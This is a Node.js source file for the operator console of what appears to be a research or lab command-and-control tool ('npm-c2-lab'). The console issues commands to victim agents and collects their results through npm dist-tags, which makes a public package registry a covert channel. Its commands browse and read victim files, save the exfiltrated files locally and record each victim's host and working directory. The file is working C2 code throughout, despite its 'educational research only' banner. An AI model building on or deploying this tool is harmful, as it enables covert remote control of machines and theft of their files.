// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// While the prompt is idle, a background poller keeps running and prints
// live notifications: agents joining (announce tags) and tasks completing
// or failing (result tags).
//
// Commands:
//   agents                      list agents seen, with last-seen info
//   task <agentId|all> <op> [args...]   publish a command tag
//                         (op allowlist: src/common/ops.js)
//   history [n]                 show the last n requests/responses (default 20)
//   poll                        fetch results or show locally pending direct tasks
//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
//   stats                       local counters: commands sent, results received
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import fs from 'node:fs';
import path from 'node:path';
import { styleText } from 'node:util';
import { pathToFileURL } from 'node:url';
import { loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  MAX_TAG_LEN,
  decodeAnnounceTag,
  decodeResultTag,
  encodeCommandTag,
  isAnnounceTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { OP_DEFS, getOpDef } from '../common/ops.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';

const tty = process.stdout.isTTY;
const c = (color, s) => (tty ? styleText(color, s) : s);

// Readability palette (no emojis, no rainbow):
//   yellow bold  section headers        bold white   command/op names
//   cyan         arguments & paths      dim          secondary text
//   green        success / joins        red          errors
//   magenta      agent ids / results    blue         prompt / outgoing
const section = (s) => c(['bold', 'yellow'], s);
const cmdName = (s) => c(['bold', 'white'], s);
const arg = (s) => c('cyan', s);
const dim = (s) => c('dim', s);

const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history

function ts() {
  return new Date().toTimeString().slice(0, 8);
}

// ---------------------------------------------------------------------------
// attacker state (separate shape from victim state, same persistence helpers)
// ---------------------------------------------------------------------------

function defaultAttackerState() {
  return {
    nextSeq: {}, // per-target (agentId or 'all') next sequence number
    sent: 0,
    received: 0,
    perAgent: {}, // agentId -> results received
    seenResults: [], // "<agentId>:<seq>" strings
    agents: [], // agent ids observed
    agentInfo: {}, // agentId -> { ts, host, cwd, lastSeen }
    history: [], // [{ dir: 'out'|'in', ts, ... }]
  };
}

function loadAttackerState(path) {
  const s = defaultAttackerState();
  try {
    const raw = JSON.parse(fs.readFileSync(path, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const k of Object.keys(s)) {
        if (raw[k] !== undefined) s[k] = raw[k];
      }
    }
  } catch {
    // missing or corrupt state file -> start fresh
  }
  return s;
}

function pushHistory(state, entry) {
  state.history.push(entry);
  if (state.history.length > HISTORY_MAX) {
    state.history.splice(0, state.history.length - HISTORY_MAX);
  }
}

/** Direct requests without a matching locally recorded response. */
export function pendingDirectTasks(history) {
  const completed = new Set(
    history
      .filter((entry) => entry.dir === 'in')
      .map((entry) => `${entry.agentId}:${entry.seq}:${entry.op}`),
  );
  return history.filter(
    (entry) =>
      entry.dir === 'out' &&
      entry.target !== 'all' &&
      !completed.has(`${entry.target}:${entry.seq}:${entry.op}`),
  );
}

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = line.trim().split(/\s+/);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  const def = getOpDef(op);
  if (!def) {
    throw new Error(`unknown op "${op}" — allowed: ${OP_DEFS.map((o) => o.name).join(', ')}`);
  }
  const pathHint =
    '\n  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd (see pwd/cd)';
  const args = {};
  switch (def.argSpec) {
    case 'none':
      if (rest.length > 0) throw new Error(`op "${op}" takes no arguments`);
      break;
    case 'text':
      args.text = rest.join(' ');
      break;
    case 'text!':
      args.text = rest.join(' ');
      if (!args.text) throw new Error(`usage: task <agentId|all> ${def.usage}`);
      break;
    case 'url': {
      args.url = rest.join(' ');
      let parsed;
      try {
        parsed = new URL(args.url);
      } catch {
        throw new Error(`usage: task <agentId|all> ${def.usage} (http(s):// only)`);
      }
      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        throw new Error('openurl accepts http(s):// URLs only');
      }
      break;
    }
    case 'volume':
      args.level = Number(rest[0]);
      if (rest.length !== 1 || !Number.isInteger(args.level) || args.level < 0 || args.level > 100) {
        throw new Error(`usage: task <agentId|all> ${def.usage}`);
      }
      break;
    case 'path':
      args.path = rest.join(' ');
      if (!args.path) throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
      break;
    case 'path?':
      if (rest.length > 0) args.path = rest.join(' ');
      break;
    case 'path+query':
      [args.path] = rest;
      args.query = rest.slice(1).join(' ');
      if (!args.path || !args.query) {
        throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
      }
      break;
  }
  return { target, op, args };
}

function sanitizeFilename(name) {
  return path.basename(String(name)).replace(/[^A-Za-z0-9._-]/g, '_') || 'file.bin';
}

/** Save a transferred file from a result payload to downloads/. */
function saveDownload(agentId, r) {
  const dir = path.resolve('downloads');
  fs.mkdirSync(dir, { recursive: true });
  const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
  if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
    throw new Error('missing or invalid file size');
  }
  if (typeof r.file.dataB64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(r.file.dataB64)) {
    throw new Error('file payload is not valid base64');
  }
  const data = Buffer.from(r.file.dataB64, 'base64');
  if (data.length !== r.file.size) {
    throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
  }
  fs.writeFileSync(out, data);
  return out;
}

function formatHistoryEntry(e) {
  const at = new Date(e.ts).toTimeString().slice(0, 8);
  if (e.dir === 'out') {
    const argStr = e.args && Object.keys(e.args).length > 0 ? ` ${JSON.stringify(e.args)}` : '';
    return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
  }
  const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
  const body = e.ok ? (e.output ?? '') : (e.error ?? '');
  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${e.op} ${status}: ${body}`;
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = cfg.stateFile || 'attacker-state.json';
  const state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });

  console.log(c(['bold', 'cyan'], 'npm-c2-lab attacker CLI (educational research only)'));
  console.log(`${dim('registry:')} ${cfg.registryUrl}  ${dim('package:')} ${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log(`${dim('state:')}    ${statePath} ${dim(`(history: ${state.history.length} entries)`)}`);
  console.log(`type ${cmdName('help')} for commands`);

  // --- REPL (created before the poller so notifications can redraw the prompt)

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', 'npm-c2> '),
  });

  /** Print a live notification without eating the line the user is typing. */
  function notify(line, redraw = true) {
    console.log(line);
    if (redraw) rl.prompt(true);
  }

  // --- shared helpers -------------------------------------------------------

  function noteAgent(agentId, info = {}, redraw = true) {
    const isNew = !state.agents.includes(agentId);
    if (isNew) state.agents.push(agentId);
    const prev = state.agentInfo[agentId] ?? {};
    state.agentInfo[agentId] = {
      ...prev,
      ...info,
      lastSeen: Date.now(),
    };
    if (isNew) {
      const { host, cwd } = state.agentInfo[agentId];
      const detail = [host && `host=${host}`, cwd && `cwd=${cwd}`].filter(Boolean).join(' ');
      notify(`[${ts()}] ${c('green', '[+] agent joined:')} ${c('bold', agentId)}${detail ? ` (${detail})` : ''}`, redraw);
    }
  }

  function printResult(agentId, r, redraw = true) {
    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${r.op ?? '?'}`;
    if (!r.ok) {
      notify(`${head} ${c('red', 'FAILED')}: ${r.error}`, redraw);
      return;
    }
    if (r.file && typeof r.file.dataB64 === 'string') {
      try {
        const out = saveDownload(agentId, r);
        notify(`${head} ${c('green', 'done')}: ${r.output} -> saved to ${c('bold', out)}`, redraw);
      } catch (err) {
        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
      }
      return;
    }
    notify(`${head} ${c('green', 'done')}: ${r.output}`, redraw);
  }

  function recordResult(agentId, r) {
    pushHistory(state, {
      dir: 'in',
      ts: Date.now(),
      agentId,
      seq: r.seq,
      op: r.op ?? '?',
      ok: r.ok,
      output:
        typeof r.output === 'string' && r.output.length > HISTORY_OUTPUT_MAX
          ? `${r.output.slice(0, HISTORY_OUTPUT_MAX)}...`
          : r.output,
      error: r.error,
    });
  }

  let pollInFlight = false;

  function printPendingTasks() {
    for (const task of pendingDirectTasks(state.history).slice(-5)) {
      const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
      console.log(c('yellow', `pending: ${task.target} #${task.seq} ${task.op} (${ageSec}s)`));
    }
  }

  async function pollOnce({ quiet = false, redraw = false } = {}) {
    if (pollInFlight) {
      if (!quiet) {
        console.log('no new results');
        printPendingTasks();
      }
      return 0;
    }
    pollInFlight = true;
    try {
      const tags = await client.getDistTags();
      const groups = new Map(); // "<agentId>:<seq>" -> parts[]
      for (const name of Object.keys(tags)) {
        if (isAnnounceTag(name)) {
          try {
            const ann = decodeAnnounceTag(name);
            noteAgent(ann.agentId, {
              ts: ann.payload.ts,
              host: ann.payload.host,
              cwd: ann.payload.cwd,
            }, redraw);
          } catch (err) {
            logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
          }
          continue;
        }
        if (!isResultTag(name)) continue;
        let part;
        try {
          part = decodeResultTag(name);
        } catch (err) {
          logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
          continue;
        }
        const key = `${part.agentId}:${part.seq}`;
        if (!groups.has(key)) groups.set(key, []);
        groups.get(key).push(part);
        noteAgent(part.agentId, {}, redraw);
      }
      let fresh = 0;
      for (const [key, parts] of groups) {
        if (state.seenResults.includes(key)) continue;
        const total = parts[0].total;
        if (new Set(parts.map((p) => p.chunk)).size !== total) {
          if (!quiet) notify(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`), redraw);
          continue;
        }
        try {
          const result = reassembleResult(parts);
          const a = parts[0].agentId;
          printResult(a, result, redraw);
          recordResult(a, result);
          state.seenResults.push(key);
          state.received++;
          state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
          fresh++;
        } catch (err) {
          logger.warn(`failed to reassemble ${key}: ${err.message}`);
        }
      }
      save();
      if (!quiet) {
        console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
        if (fresh === 0) printPendingTasks();
      }
      return fresh;
    } finally {
      pollInFlight = false;
    }
  }

  // --- help rendering -------------------------------------------------------

  /** Render "left  description" rows with aligned columns. */
  function table(rows, { indent = 2, pad = 4 } = {}) {
    const width = Math.max(...rows.map(([left]) => left.length));
    return rows
      .map(
        ([left, right]) =>
          ' '.repeat(indent) + cmdName(left) + ' '.repeat(width - left.length + pad) + dim(right),
      )
      .join('\n');
  }

  const commands = {
    help() {
      const commandRows = [
        ['task <agentId|all> <op> [args]', 'publish a command tag'],
        ['agents', 'list agents seen (last-seen, host, cwd)'],
        ['history [n]', 'last n requests/responses (default 20)'],
        ['poll', 'fetch results or show locally pending direct tasks'],
        ['clean', 'delete all x-cmd-* / x-res-* / x-ann-* tags'],
        ['stats', 'local counters: sent, received, per-agent'],
        ['help', 'this help'],
        ['exit', 'save state and quit'],
      ];
      const opRows = OP_DEFS.filter((o) => o.group !== 'fun').map((o) => [o.usage, o.summary]);
      const funRows = OP_DEFS.filter((o) => o.group === 'fun').map((o) => [o.usage, o.summary]);
      console.log(
        [
          '',
          section('  COMMANDS'),
          table(commandRows),
          '',
          section(`  TASK OPS (${opRows.length})   ${dim('task <agentId|all> <op> [args]')}`),
          table(opRows),
          '',
          section(`  FUN OPS (${funRows.length})`),
          table(funRows),
          '',
          dim('  path args are absolute or relative to the agent cwd (see pwd/cd).'),
          dim('  agent joins and task results print as live notifications.'),
          '',
        ].join('\n'),
      );
    },

    async agents() {
      try {
        await pollOnce({ quiet: true }); // best-effort refresh
      } catch (err) {
        console.log(c('yellow', `registry refresh failed: ${err.message}`));
      }
      if (state.agents.length === 0) {
        console.log(dim('no agents seen yet'));
      } else {
        for (const a of state.agents) {
          const info = state.agentInfo[a] ?? {};
          const seen = info.lastSeen ? new Date(info.lastSeen).toLocaleString() : '?';
          const detail = [info.host && `host=${info.host}`, info.cwd && `cwd=${info.cwd}`]
            .filter(Boolean)
            .join(' ');
          console.log(
            `  ${c(['bold', 'green'], a)}  ${dim(`${state.perAgent[a] ?? 0} results, last seen ${seen}`)}`,
          );
          if (detail) console.log(`    ${dim(detail)}`);
        }
      }
    },

    async task(line) {
      const { target, op, args } = parseTaskLine(line);
      const seq = (state.nextSeq[target] ?? 0) + 1;
      const payload = { op, args, ts: Date.now() };
      const tag = encodeCommandTag(target, seq, payload); // throws if payload too big
      await client.setDistTag(tag, PINNED_VERSION);
      state.nextSeq[target] = seq;
      state.sent++;
      pushHistory(state, { dir: 'out', ts: Date.now(), target, seq, op, args });
      save();
      console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
      console.log(c('dim', `  ${tag}`));
      if (state.agents.length > 0 && target !== 'all' && !state.agents.includes(target)) {
        console.log(c('yellow', `  note: agent "${target}" has not been seen yet`));
      }
    },

    async poll() {
      await pollOnce();
    },

    history(line) {
      const argStr = line.trim().split(/\s+/)[1];
      const n = argStr ? Number(argStr) : 20;
      if (!Number.isSafeInteger(n) || n <= 0) {
        console.log('usage: history [n]');
        return;
      }
      const entries = state.history.slice(-n);
      if (entries.length === 0) {
        console.log(dim('history is empty'));
        return;
      }
      console.log(dim(`last ${entries.length} of ${state.history.length} entries:`));
      for (const e of entries) console.log(formatHistoryEntry(e));
    },

    async clean() {
      const tags = await client.getDistTags();
      const lab = Object.keys(tags).filter(isLabTag);
      if (lab.length === 0) {
        console.log('nothing to clean');
        return;
      }
      let deleted = 0;
      for (const tag of lab) {
        try {
          await client.deleteDistTag(tag);
          deleted++;
        } catch (err) {
          console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
        }
      }
      const remaining = Object.keys(await client.getDistTags());
      console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
    },

    stats() {
      console.log(`${dim('commands sent:')}    ${cmdName(String(state.sent))}`);
      console.log(`${dim('results received:')} ${cmdName(String(state.received))}`);
      console.log(`${dim('agents seen:')}      ${cmdName(String(state.agents.length))}`);
      for (const [a, n] of Object.entries(state.perAgent)) {
        console.log(`  ${c('magenta', a)}: ${n} results`);
      }
      console.log(`${dim('history entries:')}  ${state.history.length}`);
      console.log(`${dim('next seq:')}         ${JSON.stringify(state.nextSeq)}`);
    },
  };

  // --- background poller: live notifications while the prompt is idle -------

  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
  let rlClosed = false;
  const timer = setInterval(async () => {
    if (rlClosed) return;
    try {
      await pollOnce({ quiet: true, redraw: true });
    } catch (err) {
      notify(c('yellow', `[${ts()}] background poll failed: ${err.message}`));
    }
  }, notifyIntervalSec * 1000);
  timer.unref?.();
  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));

  // --- REPL loop ------------------------------------------------------------

  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (cmd === 'watch') {
        console.log('watch is gone — live notifications already poll in the background');
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    queue.then(() => {
      rlClosed = true;
      clearInterval(timer);
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
